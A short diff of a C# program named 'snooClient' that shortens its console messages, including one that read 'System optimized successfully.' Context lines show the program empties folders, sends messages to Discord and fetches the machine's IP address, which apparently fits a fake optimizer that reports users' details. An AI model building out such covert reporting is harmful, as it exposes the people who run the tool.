@@ -212,8 +212,9 @@ namespace snooClient
                     EmptyFolder(folder);
                 }
 
-
-                Console.WriteLine("System optimized successfully.");
+                Console.WriteLine("");
+                Console.WriteLine("finished.");
+                Console.WriteLine("");
             }
             catch (Exception ex)
             {
@@ -288,16 +289,16 @@ namespace snooClient
 
                     if (response.IsSuccessStatusCode)
                     {
-                        Console.WriteLine("Message successfully sent to Discord.");
+                        Console.WriteLine("send.");
                     }
                     else
                     {
-                        Console.WriteLine($"Failed to send message: {response.StatusCode} - {response.ReasonPhrase}");
+                        Console.WriteLine($"failed: {response.StatusCode} - {response.ReasonPhrase}");
                     }
                 }
                 catch (HttpRequestException ex)
                 {
-                    Console.WriteLine($"An error occurred: {ex.Message}");
+                    Console.WriteLine($"error: {ex.Message}");
                 }
             }
         }
@@ -330,7 +331,7 @@ namespace snooClient
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"An error occurred while fetching the IP address: {ex.Message}");
+                Console.WriteLine($"error: {ex.Message}");
             }
         }
 
